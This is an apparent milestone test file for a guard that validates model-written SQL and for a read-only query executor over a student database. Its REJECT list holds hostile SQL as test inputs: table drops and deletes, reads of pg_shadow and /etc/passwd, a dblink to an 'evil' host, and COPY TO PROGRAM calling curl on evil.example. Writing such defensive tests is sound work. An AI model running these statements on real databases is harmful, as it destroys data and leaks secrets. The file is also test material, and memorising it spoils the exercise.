"""Milestone 3 - guard model-written SQL, then execute it safely.        ./check.sh 3

Code under test:
    agent/sql_guard.py           -> validate_sql()
    services/dataset_service.py  -> run_readonly_query()

The guard tests need no database. Read the two lists below before you start:
they are the specification.
"""

from __future__ import annotations

import json
import re

import pytest

from agent.sql_guard import UnsafeSQLError, validate_sql
from services import dataset_service
from tests.conftest import table_signature

# Statements an analyst legitimately writes. Every one must be accepted.
ACCEPT = [
    "SELECT department, ROUND(AVG(marks * 100.0 / total_marks), 2) AS avg_pct "
    "FROM student_performance GROUP BY department ORDER BY avg_pct DESC",
    "select * from Student_Performance limit 5;",
    "SELECT COUNT(*) FROM student_performance; -- trailing comment",
    "/* leading comment */ SELECT COUNT(*) FROM public.student_performance",
    "WITH flagged AS (SELECT * FROM student_performance WHERE attendance < 75) "
    "SELECT department, COUNT(*) FROM flagged GROUP BY department",
    "SELECT sp.student_id, sd.subject_name, d.department_name FROM student_performance sp "
    "JOIN subject_details sd ON sd.subject = sp.subject "
    "JOIN department_details d ON d.department = sp.department WHERE sp.marks IS NULL",
    "SELECT department, COUNT(*) FILTER (WHERE marks IS NULL) AS absent FROM student_performance GROUP BY 1",
    "SELECT subject FROM student_performance UNION SELECT subject FROM subject_details",
    "SELECT student_id, RANK() OVER (PARTITION BY department ORDER BY marks DESC) FROM student_performance",
    "SELECT CASE WHEN sd.subject_type = 'Lab' THEN 50 ELSE 40 END AS pass_mark, COALESCE(sp.marks, 0), "
    "CAST(sp.marks AS integer) FROM student_performance sp JOIN subject_details sd ON sd.subject = sp.subject",
    "SELECT * FROM student_performance WHERE student_name = 'deleted'",
    "SELECT t.d FROM (SELECT department AS d FROM student_performance) AS t",
]

# Each of these is refused for a different reason. The comment says which rule.
REJECT = [
    ("SELECT 1; DROP TABLE student_performance", "two statements"),
    ("SELECT * FROM student_performance; SELECT * FROM subject_details", "two statements, both harmless"),
    ("DROP TABLE student_performance", "not a query"),
    ("DELETE FROM student_performance", "not a query"),
    ("UPDATE student_performance SET marks = 100", "not a query"),
    ("INSERT INTO department_details VALUES ('XX', 'x', 'x', 2000, 1)", "not a query"),
    ("TRUNCATE student_performance", "not a query"),
    ("CREATE TABLE copy AS SELECT * FROM student_performance", "not a query"),
    ("WITH gone AS (DELETE FROM student_performance RETURNING *) SELECT count(*) FROM gone",
     "a write hidden inside a CTE"),
    ("SELECT * INTO backup FROM student_performance", "SELECT INTO creates a table"),
    ("SELECT * FROM student_performance FOR UPDATE", "takes row locks"),
    ("SELECT * FROM pg_catalog.pg_user", "schema not allowed"),
    ("SELECT * FROM information_schema.tables", "schema not allowed"),
    ("SELECT * FROM pg_shadow", "table not allowed"),
    ("SELECT * FROM agent_notes", "table not allowed"),
    ('SELECT * FROM "Student_Performance"', "a quoted name is case-sensitive: not our table"),
    ("SELECT * FROM student_performance WHERE marks > (SELECT max(marks) FROM secret)",
     "table not allowed, inside a subquery"),
    ("SELECT pg_read_file('/etc/passwd')", "unknown function"),
    ("SELECT pg_sleep(60)", "unknown function"),
    ("SELECT set_config('statement_timeout', '0', false)", "unknown function"),
    ("SELECT * FROM generate_series(1, 1000000000)", "function in FROM"),
    ("SELECT * FROM dblink('host=evil', 'select 1') AS t(x int)", "function in FROM"),
    ("COPY student_performance TO PROGRAM 'curl evil.example'", "not a query"),
    ("EXPLAIN ANALYZE DELETE FROM student_performance", "not a query"),
    ("SET statement_timeout = 0", "not a query"),
    ("SELEC * FROM student_performance", "does not parse"),
]


@pytest.mark.parametrize("sql", ACCEPT)
def test_guard_accepts_ordinary_queries(sql):
    try:
        cleaned = validate_sql(sql)
    except UnsafeSQLError as exc:
        pytest.fail(f"this query is legitimate and was refused ({exc}):\n  {sql}", pytrace=False)
    assert isinstance(cleaned, str) and cleaned.strip(), "validate_sql() must return the SQL to execute"


@pytest.mark.parametrize("sql, why", REJECT)
def test_guard_refuses_unsafe_statements(sql, why):
    try:
        cleaned = validate_sql(sql)
    except UnsafeSQLError:
        return
    except Exception as exc:  # noqa: BLE001
        pytest.fail(f"validate_sql() must raise UnsafeSQLError, not {type(exc).__name__} ({exc}), for:\n  {sql}",
                    pytrace=False)
    pytest.fail(f"this statement must be refused ({why}) but validate_sql() returned:\n  {cleaned}\n"
                f"for:\n  {sql}", pytrace=False)


def test_guard_treats_blank_input_as_unsafe_not_as_a_crash():
    assert validate_sql("SELECT 1").strip(), "a trivial SELECT must be accepted"
    for blank in ("", "   ", ";", "-- only a comment"):
        with pytest.raises(UnsafeSQLError):
            validate_sql(blank)


def test_guard_adds_a_limit_when_there_is_none():
    cleaned = validate_sql("SELECT * FROM student_performance", max_rows=50)
    assert re.search(r"\bLIMIT 50\b", cleaned, re.I), f"expected LIMIT 50 to be added, got: {cleaned}"


@pytest.mark.parametrize("tail", ["LIMIT 100000", "LIMIT ALL", "FETCH FIRST 5000 ROWS ONLY"])
def test_guard_caps_a_limit_that_is_too_large(tail):
    cleaned = validate_sql(f"SELECT * FROM student_performance {tail}", max_rows=200)
    assert re.search(r"\bLIMIT 200\b", cleaned, re.I), f"`{tail}` must become LIMIT 200, got: {cleaned}"
    assert "100000" not in cleaned and "5000" not in cleaned, f"the oversized limit is still there: {cleaned}"


def test_guard_keeps_a_limit_that_is_already_small_enough():
    cleaned = validate_sql("SELECT * FROM student_performance ORDER BY marks DESC LIMIT 5 OFFSET 10", max_rows=200)
    assert re.search(r"\bLIMIT 5\b", cleaned, re.I), f"LIMIT 5 should have been kept, got: {cleaned}"
    assert "OFFSET 10" in cleaned.upper(), f"the OFFSET was lost: {cleaned}"


def test_refusal_message_says_what_was_wrong():
    with pytest.raises(UnsafeSQLError) as table_error:
        validate_sql("SELECT * FROM salary_details")
    assert "salary_details" in str(table_error.value), (
        "name the refused table in the message - the model reads it and corrects itself")
    with pytest.raises(UnsafeSQLError) as function_error:
        validate_sql("SELECT pg_sleep(5)")
    assert "pg_sleep" in str(function_error.value), "name the refused function in the message"


# ── execution ────────────────────────────────────────────────────────────────

def test_query_returns_columns_rows_and_counts(loaded_data, expected):
    result = dataset_service.run_readonly_query(validate_sql(
        "SELECT department, ROUND(AVG(marks * 100.0 / total_marks), 2) AS average_percentage "
        "FROM student_performance GROUP BY department ORDER BY average_percentage DESC"))
    assert set(result) >= {"columns", "rows", "row_count", "truncated"}, (
        f"the result needs the keys columns, rows, row_count, truncated - got {sorted(result)}")
    assert result["columns"] == ["department", "average_percentage"]
    assert result["row_count"] == 5 and result["truncated"] is False
    got = [[row[0], row[1]] for row in result["rows"]]
    for (dept, value), (want_dept, want_value) in zip(got, expected["department_average"]):
        assert dept == want_dept and value == pytest.approx(want_value, abs=0.011), (
            f"department averages are {got}, expected {expected['department_average']}")


def test_query_result_is_json_safe(loaded_data):
    result = dataset_service.run_readonly_query(
        "SELECT student_id, marks, attendance FROM student_performance ORDER BY student_id, subject LIMIT 20")
    try:
        json.dumps(result)
    except TypeError as exc:
        pytest.fail(f"the result cannot be turned into JSON ({exc}). Pass every value through _jsonable().",
                    pytrace=False)
    assert any(isinstance(value, float) for row in result["rows"] for value in row), (
        "numeric columns should come back as floats, not Decimals")


def test_row_limit_is_enforced_and_reported(loaded_data):
    result = dataset_service.run_readonly_query("SELECT * FROM student_performance", max_rows=7)
    assert result["row_count"] == 7 and len(result["rows"]) == 7, (
        f"asked for at most 7 rows, got {len(result['rows'])}")
    assert result["truncated"] is True, (
        "2400 rows matched and 7 came back, so `truncated` must be True. "
        "Fetch max_rows + 1 rows to find out whether there were more.")
    small = dataset_service.run_readonly_query("SELECT * FROM department_details", max_rows=7)
    assert small["row_count"] == 5 and small["truncated"] is False


def test_database_refuses_writes_even_without_the_guard(loaded_data):
    """Defence in depth: this bypasses validate_sql() on purpose."""
    before = table_signature()
    for statement in ("DELETE FROM student_performance",
                      "UPDATE student_performance SET marks = 100",
                      "CREATE TABLE sneaky (x integer)"):
        with pytest.raises(Exception) as caught:  # noqa: PT011 - any database error will do
            dataset_service.run_readonly_query(statement)
        assert "read-only" in str(caught.value).lower(), (
            f"`{statement}` was not stopped by a read-only transaction (got: {caught.value}). "
            "Set conn.read_only = True before executing anything.")
    assert table_signature() == before, "the data changed - run_readonly_query() allowed a write"


def test_a_runaway_query_is_cancelled(loaded_data):
    with pytest.raises(Exception) as caught:  # noqa: PT011
        dataset_service.run_readonly_query("SELECT pg_sleep(5)", timeout_ms=300)
    assert "timeout" in str(caught.value).lower(), (
        f"a 5 second query with a 300 ms limit should be cancelled by statement_timeout, got: {caught.value}")
